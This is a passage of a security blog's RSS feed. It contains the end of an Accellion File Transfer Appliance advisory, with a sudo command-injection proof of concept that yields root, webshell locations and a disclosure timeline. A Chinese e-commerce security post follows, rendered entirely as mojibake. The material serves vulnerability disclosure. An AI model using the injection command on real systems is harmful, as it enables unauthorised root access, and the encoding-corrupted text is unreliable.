&lt;p&gt;After taking a closer look on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ymm-client.pl&lt;/code&gt;, a Command Injection vulnerability was found on the parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--cdrom&lt;/code&gt;. This vulnerability enables attackers to inject any commands into the parameter and execute as root.&lt;/p&gt;

&lt;p&gt;Thus, using the commands below&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/local/bin/yum-client.pl &lt;span class=&quot;nt&quot;&gt;--cdrom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;$(id &amp;gt; /tmp/.gg)&apos;&lt;/span&gt;

mount: can&lt;span class=&quot;s1&quot;&gt;&apos;t find /mnt/cdrom in /etc/fstab or /etc/mtab
unable to mount: Bad file descriptor at /usr/local/bin/yum-client.pl line 113.

bash-3.2$ cat /tmp/.gg
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;will grant execution freely as root!&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;backdoor&quot;&gt;Backdoor&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
After gaining the highest privilege and carrying out server recon, we identified that several backdoors had been already planted in FTA hosts. One of them is an IRC Botnet which had been mentioned in Niara‚Äôs &lt;a href=&quot;http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf&quot;&gt;Accellion File Transfer Appliance Vulnerability&lt;/a&gt;.&lt;br /&gt;
Apart from that, two additional PHP Webshells of different types which had NEVER been noted in public reports were also identified. Through reviewing Apache Log, these backdoors might be placed by exploiting the CVE-2015-2857 vulnerability discovered in mid-2015.&lt;/p&gt;

&lt;p&gt;One of the backdoors is PHPSPY, it is found on 62 of the online hosts globally. It was placed in&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/themes/templates/Redirector_Cache.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The other is WSO, found on 9 of the online hosts globally, placed in&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/themes/templates/imag.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;acknowledgement&quot;&gt;Acknowledgement&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
The vulnerability mentioned in this Advisory was identified in early 2016 while looking for vulnerabilities in Facebook, you can refer to the article ‚Äú&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someone‚Äôs Backdoor Script&lt;/a&gt;‚Äù.&lt;br /&gt;
Upon discovering the FTA vulnerability in early February, I notified Facebook and Accellion and both were very responsive. Accellion responded immediately, issuing patch FTA_9_12_40 on February 12th and notifying all affected customers about the vulnerability and instructions to install the patch. Accellion has been very communicative and cooperative throughout this process.&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;timeline&quot;&gt;Timeline&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Feb  6, 2016 05:21 Contact Accellion for vulnerability report&lt;/li&gt;
  &lt;li&gt;Feb  7, 2016 12:35 Send the report to Accellion Support Team&lt;/li&gt;
  &lt;li&gt;Mar  3, 2016 03:03 Accellion Support Team notifies patch will be made in FTA_9_12_40&lt;/li&gt;
  &lt;li&gt;May 10, 2016 15:18 Request Advisory submission approval and report the new discovery of two backdoors to Accellion&lt;/li&gt;
  &lt;li&gt;Jun  6, 2016 10:20 Advisory finalized by mutual consent&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;R7-2015-08: Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt; &lt;a name=&quot;ref1&quot;&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rapid7.com/resources/advisories/R7-0039.jsp&quot;&gt;Rapid7 Advisory R7-0039: Accellion File Transfer Appliance Multiple Vulnerabilities&lt;/a&gt; &lt;a name=&quot;ref2&quot;&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf&quot;&gt;Threat Advisory: Accellion File Transfer Appliance Vulnerability&lt;/a&gt; &lt;a name=&quot;ref3&quot;&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/</link>
                <guid>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver</guid>
                <pubDate>Thu, 22 Sep 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ÈõªÂïÜÊ•≠ËÄÖÁöÑË≥áÂÆâÂõ∞Â¢ÉÔºü</title>
                <description>&lt;p&gt;Âè∞ÁÅ£ÈõªÂïÜÁ∂≤Á´ôËì¨ÂãÉÁôºÂ±ïÔºåË±êÂØåÁöÑÂÄãË≥á„ÄÅÈáëÊµÅÈÉΩÂê∏Âºï‰∫ÜÊîªÊìäËÄÖ„ÄÇËøëÊúüÂàë‰∫ãÂ±Ä 165 ÂèçË©êÈ®ôÁ∂≤Á´ô‰∏äÂ∏∏ÁúãÂà∞ÂæàÂ§öÈõªÂïÜÁ∂≤Á´ôÈù¢Ëá®ÂÄãË≥áÂ§ñÊ¥©ÁöÑÂïèÈ°åÔºåÊñ∞ËÅû‰πü‰∏çÊñ∑Â†±Â∞éÊ∞ëÁúæÂõ†ÁÇ∫ÂÄãË≥áÂ§ñÊ¥©Ë¢´Ë©êÈ®ôÈõÜÂúòÈ®ôÂèñÈå¢Ë≤°„ÄÇË≥áÂÆâÂïèÈ°åÊòØÈõªÂïÜÊ•≠ËÄÖÈù¢Ëá®Âà∞ÊúÄÂ§ßÁöÑÂç±Ê©üÔºåÊ∞ëÁúæ‰πüÂæàÊÜ§ÊÄíÁÇ∫‰ªÄÈ∫ºÈÄô‰∫õ‰ºÅÊ•≠ÈÉΩ‰∏çËÇØÊääË≥áÂÆâÂÅöÂ•Ω„ÄÇ‰ΩÜÊàëÁõ∏‰ø°ÔºåÈõªÂïÜÁ∂≤Á´ôÁöÑÊ•≠‰∏ª‰πüÊòØÊúâËã¶Èõ£Ë®Ä„ÄÇ‰∏çÂ∞ë‰ºÅÊ•≠Áü•ÈÅìË©≤ÊääË≥áÂÆâÂÅöÂ•ΩÔºåÊúâ‰∫õÂèØËÉΩ‰∏çÂæóÂÖ∂Ê≥ïÔºå‰πüÂèØËÉΩ‰ªÄÈ∫ºÈÉΩÂÅö‰∫ÜÔºåÂçªÈÇÑÊòØÁÑ°Ê≥ïÈò≤Ê≠¢Ëá™Â∑±ÁöÑÁ∂≤Á´ôÂá∫ÁèæÂú® 165 Ë©êÈ®ôÊéíË°åÁöÑÊ¶úÂñÆ‰∏ä„ÄÇ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÂÖßÊîøÈÉ®Ë≠¶ÊîøÁΩ≤ 165 ÂèçË©êÈ®ôË´ÆË©¢Â∞àÁ∑ö Ê∞ëÁúæÈÄöÂ†±È´òÈ¢®Èö™Ë≥£Â†¥ÊéíÂêç
&lt;a href=&quot;http://165.gov.tw/loss_rank.aspx&quot;&gt;http://165.gov.tw/loss_rank.aspx&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Â∞çÊñºÁÑ°ÂøÉÊñºË≥áÂÆâÁöÑÊ•≠ËÄÖ‰æÜË™™ÔºåË¢´Êè≠Èú≤ÈÄôÊ®£ÁöÑË≥áË®äÊúÉÊúâ‰∏ÄÂÆöÁ®ãÂ∫¶ÁöÑÂäõÈáèËø´‰Ωø‰ªñÂÄëÊääË≥áÂÆâÂÅöÂ•Ω„ÄÇ‰ΩÜÂ∞çÊñºÂ∑≤Á∂ìÈ°ßÂÖ®Ë≥áÂÆâÁöÑÊ•≠ËÄÖ‰æÜË™™ÔºåÂâáÊòØÊë∏‰∏çËëóÈ†≠Á∑íÂà∞Â∫ïÂÄãË≥áÂæûÂì™ÈÇäÂ§ñÊ¥©ÁöÑ„ÄÇ‰ªäÂ§©ÊàëÂÄëÂ∞±‰æÜË´áË´áÔºåÂà∞Â∫ïÈõªÂïÜÁ∂≤Á´ôÁöÑË≥áÂÆâÂïèÈ°åÊòØ‰ªÄÈ∫ºÔºåÊ∞ëÁúæÁöÑÂÄãË≥áÂèàÊòØÊÄéÈ∫ºÂ§ñÊ¥©ÁöÑ„ÄÇ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ÈõªÂïÜÁ∂≤Á´ôÁöÑÂõ∞Â¢É&quot;&gt;ÈõªÂïÜÁ∂≤Á´ôÁöÑÂõ∞Â¢É&lt;/h3&gt;

&lt;p&gt;ÁõÆÂâçÈõªÂïÜÁ∂≤Á´ôÂ∏∏Ë¶ãÁöÑÂõ∞Â¢ÉÊúâÂπæÈªûÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Ëá™Ë°åÈñãÁôºÁ∂≤Á´ôÂ≠òÂú®ÊºèÊ¥û&lt;/li&gt;
  &lt;li&gt;ÂßîÂ§ñÈñãÁôºÁ∂≤Á´ôÂ≠òÂú®ÊºèÊ¥ûÔºå‰ΩÜÊâøÂåÖÂïÜ‰∏çËôïÁêÜ&lt;/li&gt;
  &lt;li&gt;ÂÖßÈÉ®Âì°Â∑•ÈõªËÖ¶ÈÅ≠ÂÖ•‰æµÂ§ñÊ¥©ÂÄãË≥á&lt;/li&gt;
  &lt;li&gt;ÈÖçÂêàÂª†ÂïÜÂÄãË≥áÂ§ñÊ¥©ÔºåÂ¶ÇÈáëÊµÅÂïÜ„ÄÅÁâ©ÊµÅÂïÜ&lt;/li&gt;
  &lt;li&gt;ÊîªÊìäËÄÖÁî®Â∑≤Â§ñÊ¥©Â∏≥ËôüÂØÜÁ¢ºÁôªÂÖ•ÈõªÂïÜÁ∂≤Á´ô&lt;/li&gt;
  &lt;li&gt;Ë≤∑ÂÆ∂Âú®Ë©êÈ®ôÈõÜÂúòÁöÑË≥£Â†¥‰∫§Êòì&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ÈªëËâ≤Áî¢Ê•≠ÁöÑÁôºÂ±ïÊØîÂ§ßÂÆ∂ÊÉ≥ÂÉè‰∏≠ÈÉΩÈÇÑË¶ÅÁõõË°åÔºåËã•‰ºÅÊ•≠Â∞çÊîªÊìäËÄÖ‰æÜË™™ÊúâÂà©ÂèØÂúñÔºåÈß≠ÂÆ¢ÁµÑÁπîÊúÉ‰∏çÊìáÊâãÊÆµÂÖ•‰æµÂèñÂæóË≥áÊñô„ÄÇÂõ†Ê≠§Â∞çÁ∂≤Á´ôÊú¨Ë∫´„ÄÅÁ∂≤Á´ôÂë®ÈÅ≠Á≥ªÁµ±„ÄÅ‰ºÅÊ•≠ÂÖßÈÉ®Âì°Â∑•„ÄÅÊàñËÄÖ‰ª•Á§æ‰∫§Â∑•Á®ãÊâãÊ≥ïÔºåÂè™Ë¶ÅËÉΩÂèñÂæóË≥áÊñôÈÉΩÊúÉÊòØ‰ªñÂÄë‰∏ãÊâãÁöÑÁõÆÊ®ô„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;Ëá™Ë°åÈñãÁôºÁ∂≤Á´ôÂ≠òÂú®ÊºèÊ¥û&quot;&gt;Ëá™Ë°åÈñãÁôºÁ∂≤Á´ôÂ≠òÂú®ÊºèÊ¥û&lt;/h4&gt;

&lt;p&gt;ÈÄôÊòØÁõÆÂâç‰ºÅÊ•≠ÊúÄÈúÄË¶ÅÂÖàËß£Ê±∫ÁöÑÂïèÈ°å„ÄÇËã•Á∂≤Á´ôÊú¨Ë∫´Ë≥áÂÆâÈ´îË≥™‰∏çÂ•ΩÔºåÂâáÊúÉËºïÊòìË¢´ÊîªÊìäËÄÖÂÖ•‰æµ„ÄÇË≥áÂÆâÂïèÈ°åÂæÄÂæÄÈÉΩÊòØ‰ºÅÊ•≠ÂÖßÈÉ®ÊúÄÈõ£Ëß£ÁöÑÂïèÈ°åÔºåÈÅìÈ´ò‰∏ÄÂ∞∫È≠îÈ´ò‰∏Ä‰∏àÔºåËã•Ê≤íÊúâÁ∂ìÈÅéÂÆåÊï¥ÁöÑ&lt;a href=&quot;https://devco.re/services/penetration-test/&quot;&gt;Êª≤ÈÄèÊ∏¨Ë©¶&lt;/a&gt;ÔºåÂâáÈõ£‰ª•ÊâæÂá∫ÂïèÈ°åÁöÑÊ†πÊ∫ê„ÄÇÊâæÂà∞‰∫ÜÂïèÈ°å‰πãÂæåÔºåÈñãÁôº‰∫∫Âì°ÁöÑÊïôËÇ≤Ë®ìÁ∑¥„ÄÅË≥áÂÆâÊ©üÂà∂„ÄÅË≥áÂÆâË®≠ÂÇôÔºåÈÉΩÊúÉÊòØ‰ºÅÊ•≠Êé•‰∏ã‰æÜË¶ÅÈù¢Â∞çÁöÑË™≤È°å„ÄÇ&lt;/p&gt;

&lt;p&gt;Ëß£Ê±∫ÊñπÊ°àÔºöÊª≤ÈÄèÊ∏¨Ë©¶„ÄÅË≥áÂÆâÈ°ßÂïè„ÄÅÊïôËÇ≤Ë®ìÁ∑¥&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/the_security_dilemma_of_e-commerce_1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ÂßîÂ§ñÈñãÁôºÁ∂≤Á´ôÂ≠òÂú®ÊºèÊ¥û‰ΩÜÊâøÂåÖÂïÜ‰∏çËôïÁêÜ&quot;&gt;ÂßîÂ§ñÈñãÁôºÁ∂≤Á´ôÂ≠òÂú®ÊºèÊ¥ûÔºå‰ΩÜÊâøÂåÖÂïÜ‰∏çËôïÁêÜ&lt;/h4&gt;

&lt;p&gt;‰∏çÂ∞ë‰ºÅÊ•≠Ê≤íÊúâËá™Â∑±ÈñãÁôºÁ∂≤Á´ôÔºåËÄåÊòØÁôºÂåÖÁµ¶Â§ñÈÉ®Âª†ÂïÜÈñãÁôº„ÄÅÁ∂≠ÈÅã„ÄÇÊâøÂåÖÂïÜÁöÑÂìÅË≥™ÈÄöÂ∏∏Èõ£‰ª•ÊéåÊéßÔºåÂÉπÊ†ºÊà∞ÁöÑÊ•≠ÁïåÁîüÊÖãÔºåÊõ¥ËÆìÈñãÁôºÁöÑÂìÅË≥™Èõ£‰ª•ÊèêÂçá„ÄÇ‰ΩÜÊ•≠ËÄÖÊúÄÈ†≠Â§ßÁöÑÊòØÔºöÊâøÂåÖÂïÜÊãíÁµïËôïÁêÜÊºèÊ¥û„ÄÇËã•Ê≤íÊúâÂú®‰∏ÄÈñãÂßãÁöÑÂßîÂ§ñÂêàÁ¥ÑÂ∞±ÊòéË®ÇË≥áÂÆâÁ∂≠Ë≠∑Ê®ôÊ∫ñÔºåÂú®Êó•ÂæåÁôºÁîüË≥áÂÆâ‰∫ã‰ª∂ÊôÇÂâáÈõ£‰ª•Ë¶ÅÊ±ÇÊâøÂåÖÂïÜ‰øÆË£úÊºèÊ¥û„ÄÇÂõ†Ê≠§Âª∫Ë≠∞Ê•≠ËÄÖÂú®Êó•ÂæåÁöÑÂßîÂ§ñÈñãÁôºÊ°àÔºåÊòéË®ÇË≥áÂÆâÊ®ôÊ∫ñ„ÄÅÈ©óÊî∂ÊôÇÊ™¢ÈôÑÁ¨¨‰∏âÊñπÊª≤ÈÄèÊ∏¨Ë©¶Â†±ÂëäÔºå‰∏¶‰∏îÂ∞áÊó•ÂæåË≥áÂÆâÁ∂≠Ë≠∑ÂêàÁ¥ÑÁç®Á´ãÊñº‰∏ÄËà¨Á∂≠Ë≠∑Á¥Ñ‰πãÂ§ñÔºåÂº∑Âà∂Âü∑Ë°å„ÄÇ&lt;/p&gt;

&lt;p&gt;Ëß£Ê±∫ÊñπÊ°àÔºöÈÅ∏ÂïÜÊ®ôÊ∫ñ„ÄÅÈñãÊ®ôË¶èÊ†º„ÄÅÈ©óÊî∂Ê®ôÊ∫ñ„ÄÅË≥áÂÆâÁ∂≠Ë≠∑ÂêàÁ¥Ñ&lt;/p&gt;

&lt;h4 id=&quot;ÂÖßÈÉ®Âì°Â∑•ÈõªËÖ¶ÈÅ≠ÂÖ•‰æµÂ§ñÊ¥©ÂÄãË≥á&quot;&gt;ÂÖßÈÉ®Âì°Â∑•ÈõªËÖ¶ÈÅ≠ÂÖ•‰æµÂ§ñÊ¥©ÂÄãË≥á&lt;/h4&gt;

&lt;p&gt;Èô§‰∫Ü‰º∫ÊúçÂô®‰πãÂ§ñÔºåÂÆ¢Êà∂Á´Ø‰πüÊòØÊîªÊìäËÄÖ‰∏ãÊâãÁöÑÁõÆÊ®ô„ÄÇÁï∂Á∂≤Á´ôÈõ£‰ª•Ë¢´ÂÖ•‰æµÔºåÊîªÊìäËÄÖÂ∞±ÊúÉËΩâÂæÄÂì°Â∑•ÈõªËÖ¶‰∏ãÊâã„ÄÇÈÄèÈÅéÁ§æ‰∫§Â∑•Á®ã„ÄÅÊê≠ÈÖçÊÉ°ÊÑèÈÉµ‰ª∂Á≠â APT ÊîªÊìäÔºåÂÖ•‰æµÂÄã‰∫∫ÈõªËÖ¶ÂæåÂèñÂæóÊ∂àË≤ªËÄÖÂÄãË≥áÔºåÁîöËá≥ÂÅöÁÇ∫Ë∑≥ÊùøÊª≤ÈÄè‰ºÅÊ•≠ÂÖßÈÉ®Êì¥Â§ßÊîªÊìäÊàêÊûú„ÄÇËã•Ê≤íÊúâË∂≥Â§†ÁöÑË≥áÂÆâÊÑèË≠òÔºåÂì°Â∑•Â∞áÊúÉÊòØ‰ºÅÊ•≠ÊúÄÂ§ßÁöÑË≥áÂÆâÁº∫Âè£„ÄÇ&lt;/p&gt;

&lt;p&gt;Ëß£Ê±∫ÊñπÊ°àÔºöÂº∑ÂåñË≥áÂÆâÊÄùÁ∂≠„ÄÅÊ¨äÈôêÊúÄÂ∞èÂåñ„ÄÅAPT Èò≤Á¶¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/the_security_dilemma_of_e-commerce_2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ÈÖçÂêàÂª†ÂïÜÂÄãË≥áÂ§ñÊ¥©Â¶ÇÈáëÊµÅÂïÜÁâ©ÊµÅÂïÜ&quot;&gt;ÈÖçÂêàÂª†ÂïÜÂÄãË≥áÂ§ñÊ¥©ÔºåÂ¶ÇÈáëÊµÅÂïÜ„ÄÅÁâ©ÊµÅÂïÜ&lt;/h4&gt;

&lt;p&gt;Áï∂‰ºÅÊ•≠Ë£°Ë£°Â§ñÂ§ñÈÉΩÈò≤Á¶¶Â•Ω‰∫ÜÔºåÂÄãË≥áÈÇÑÂú®Â§ñÊ¥©ÔºåÂà∞Â∫ïÁôºÁîü‰ªÄÈ∫º‰∫ãÊÉÖ‰∫ÜÂë¢ÔºüÂà•Âøò‰∫Ü‰∏ÄÂÄãÈõªÂïÜÁ∂≤Á´ôÊúâÂêÑÁ®ÆËàáÂ§ñÁïåÊ©ãÊé•ÁöÑÊúçÂãôÔºå‰æãÂ¶Ç‰∫§ÊòìÁöÑÈáëÊµÅ„ÄÅÈÅãËº∏ÁöÑÁâ©ÊµÅ„ÄÇËã•Êê≠ÈÖçÁöÑÂ§ñÈÉ®Á≥ªÁµ±ÈÅ≠Âà∞ÂÖ•‰æµÔºåÂÄãË≥á‰∏ÄÊ®£ÊúÉË¢´ÂèñÂæó„ÄÇ‰ΩÜÊ∞ëÁúæ„ÄÅÂ™íÈ´îÂè™ÊúÉË¶∫Âæó„ÄåÊàëÂú®ÈÄôÂÆ∂ÈõªÂïÜÂπ≥Âè∞Ë≤∑Êù±Ë•øË¢´Ë©êÈ®ô„ÄçÔºåËÄåÊÄ™ÁΩ™Âà∞‰ºÅÊ•≠Êú¨Ë∫´„ÄÇ‰ºÅÊ•≠ÊúâË≤¨‰ªªË¶ÅÊ±ÇÈÖçÂêàÁöÑÂª†ÂïÜ‰∏ÄÂêåÂ∞áË≥áÂÆâ„ÄÅÂÄãË≥áÊääÈóúÂ•Ω„ÄÇ&lt;/p&gt;

&lt;p&gt;Ëß£Ê±∫ÊñπÊ°àÔºöÈÖçÂêàÂª†ÂïÜÁöÑË≥áÂÆâË¶èÁØÑ„ÄÅÊª≤ÈÄèÊ∏¨Ë©¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/the_security_dilemma_of_e-commerce_3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ÊîªÊìäËÄÖÁî®Â∑≤Â§ñÊ¥©Â∏≥ËôüÂØÜÁ¢ºÁôªÂÖ•ÈõªÂïÜÁ∂≤Á´ô&quot;&gt;ÊîªÊìäËÄÖÁî®Â∑≤Â§ñÊ¥©Â∏≥ËôüÂØÜÁ¢ºÁôªÂÖ•ÈõªÂïÜÁ∂≤Á´ô&lt;/h4&gt;

&lt;p&gt;Ë≥áÂÆâÁöÑË≤¨‰ªª‰∏¶‰∏çÂÉÖÂú®‰ºÅÊ•≠ÔºåÊúâÁöÑÊôÇÂÄôÊ∂àË≤ªËÄÖÊú¨Ë∫´Â∏≥ËôüÁöÑÂÆâÂÖ®‰πüÊúÉÂΩ±ÈüøÂà∞ÈõªÂïÜÁ∂≤Á´ôÁöÑÊ∏ÖË≠Ω„ÄÇÁõÆÂâçÊ∞ëÁúæÂè™Ë¶ÅÊé•Êî∂Âà∞Ë©êÈ®ôÈõªË©±ÔºåÁõ¥Ë¶∫ÈÉΩÊúÉÊòØÂú®ÊüêÂÄãÂ∫óÂÆ∂ÁöÑ‰∫§ÊòìË¢´Èß≠ÔºåË¢´ÂèñÂæóË≥áÊñôÂæåË≤©ÂîÆÁµ¶Ë©êÈ®ôÈõÜÂúòÔºåÂõ†ËÄåÂõûÂ†±Áµ¶ 165 Á≠âÂèçË©êÈ®ôÂ∞àÁ∑ö„ÄÇÈÄôÁ®ÆÊ°à‰æã‰πüÊúÉÁÆóÂú®ÈõªÂïÜÁ∂≤Á´ôÁöÑÂ∏≥‰∏äÔºå‰ΩÜÂçª‰∏ç‰∏ÄÂÆöÊòØÈõªÂïÜÁ∂≤Á´ôÁöÑÂïèÈ°å„ÄÇÈÄôÊ®£ÁöÑÊîªÊìäÊâãÊ≥ï‰πü‰øóÁ®±„ÄåÊíûÂ∫´„Äç„ÄÇ&lt;/p&gt;

&lt;p&gt;Ëß£Ê±∫ÊñπÊ°àÔºö‰ºÅÊ•≠ÈñìÁöÑËÅØÈò≤„ÄÅÊèê‰æõ‰ΩøÁî®ËÄÖÂ∏≥Ëôü‰øùË≠∑&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/the_security_dilemma_of_e-commerce_4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Ë≤∑ÂÆ∂Âú®Ë©êÈ®ôÈõÜÂúòÁöÑË≥£Â†¥‰∫§Êòì&quot;&gt;Ë≤∑ÂÆ∂Âú®Ë©êÈ®ôÈõÜÂúòÁöÑË≥£Â†¥‰∫§Êòì&lt;/h4&gt;

&lt;p&gt;Âè™Ë¶ÅÊúâÂà©ÂèØÂúñÔºåË©êÈ®ôÈõÜÂúòÂ∞±ÊúÉÁÑ°ÊâÄ‰∏çÁî®ÂÖ∂Ê•µÁöÑÊÉ≥Áç≤ÂèñÂà©Áõä„ÄÇÁï∂Á≥ªÁµ±Â∑≤Á∂ìÈÅîÊàêÂü∫Êú¨ÁöÑÂÆâÂÖ®„ÄÅ‰ΩøÁî®ËÄÖÂ§ñÊ¥©ÁöÑÂ∏≥Ëôü‰πüÂ∑≤Á∂ìÁÑ°Ê≥ïÂà©Áî®‰πãÂæåÔºåË©êÈ®ôÈõÜÂúòÂ∞áÂÜçÊîªÊìä‰∫∫ÊÄßÁöÑÊºèÊ¥ûÔºåÈñãË®≠Ë≤©Ë≥£ÁÜ±ÈñÄÂïÜÂìÅÁöÑË≥£Â†¥ÔºåÂê∏ÂºïÁÑ°ËæúÁöÑÂèóÂÆ≥ËÄÖË≥ºË≤∑„ÄÇÊàñËÄÖÂú®Ë≥£Â†¥ÁöÑÁïôË®ÄÂçÄÂ°äÂÅáÂÜíË≥£ÂÆ∂ÔºåÁïô‰∏ãËá™Â∑±ÁöÑ LINE ËàáÊ∂àË≤ªËÄÖÊ∫ùÈÄöÔºåÈÄ≤Ë°åË©êÈ®ô„ÄÇ&lt;/p&gt;

&lt;p&gt;Ëß£Ê±∫ÊñπÊ°àÔºöÊ∂àË≤ªËÄÖÂÆâÂÖ®ÂÆ£Â∞é&lt;/p&gt;

&lt;h3 id=&quot;ÈõªÂïÜÊ•≠ËÄÖË©≤Â¶Ç‰ΩïËá™‰øù&quot;&gt;ÈõªÂïÜÊ•≠ËÄÖË©≤Â¶Ç‰ΩïËá™‰øùÔºü&lt;/h3&gt;

&lt;p&gt;Âè™Ë¶ÅÊúâÂà©ÁõäÁöÑÂú∞ÊñπÔºåÂ∞±ÊúÉÊúâË≥áÂÆâÂç±Ê©ü„ÄÇÈõñË™™ÈÅìÈ´ò‰∏ÄÂ∞∫È≠îÈ´ò‰∏Ä‰∏àÔºå‰ΩÜÊ•≠ËÄÖ‰∏¶ÈùûÂè™ËÉΩÁ≠âËëóË¢´ÂÆ∞„ÄÇÁ∂ìÁáüÁ∂≤Á´ôÊúÄÈáçË¶ÅÁöÑÂ∞±ÊòØ‰øùË≠∑È°ßÂÆ¢ÁöÑË≥áÊñôÔºåÊòéÁôΩÈ¢®Èö™ÁöÑÊâÄÂú®„ÄÇÁõ§ÈªûÊâã‰∏äÁöÑÂÄãË≥á‰ΩçÁΩÆ„ÄÅÊ©üÂà∂„ÄÅÊé™ÊñΩÔºåË¨πÊÖéÂÆâÊéíË≥áÂÆâË¶èÂäÉÔºåÁ¢∫‰øùÂ∞áÂÆâÂÖ®ÁöÑÈ¢®Èö™ÈôçÂà∞ÊúÄ‰Ωé„ÄÇÊõ¥ÈÄ≤‰∏ÄÊ≠•‰πüÂèØ‰ª•Âª∫Á´ãËàáË≥áÂÆâ‰∫∫Âì°ËâØÂ•ΩÁöÑÈóú‰øÇÔºåÂÖ¨ÈñãÊºèÊ¥ûÈÄöÂ†±ÁÆ°ÈÅìÂèäÁçéÂãµÊ©üÂà∂ÔºåÈºìÂãµË≥áÂÆâ‰∫∫Âì°ÂÑ™ÂÖàÈÄöÂ†±ÊºèÊ¥ûÁµ¶‰ºÅÊ•≠ÔºåÈÅøÂÖçÊµÅÂÖ•ÈªëËâ≤Áî¢Ê•≠„ÄÇÁï∂ÁÑ∂ÔºåË∫´ÁÇ∫Ê∂àË≤ªËÄÖÁöÑÊàëÂÄëÔºå‰πüÊáâË©≤Áµ¶‰∫àË≤†Ë≤¨ÁöÑ‰ºÅÊ•≠ÊéåËÅ≤„ÄÇ&lt;/p&gt;

&lt;p&gt;Âú®Êú™‰æÜÊàëÂÄëÁöÑÊñáÁ´†Â∞áÊèêÂà∞‰ºÅÊ•≠ÊáâË©≤Êé°ÂèñÁöÑÂÖ∑È´î‰ΩúÁÇ∫ÔºåÊï¨Ë´ãÊúüÂæÖÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2016/07/29/the_security_dilemma_of_e-commerce/</link>
                <guid>https://devco.re/blog/2016/07/29/the_security_dilemma_of_e-commerce</guid>
                <pubDate>Fri, 29 Jul 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Êª≤ÈÄè Facebook ÁöÑÊÄùË∑ØËàáÁôºÁèæ</title>
                <description>&lt;p&gt;by &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;

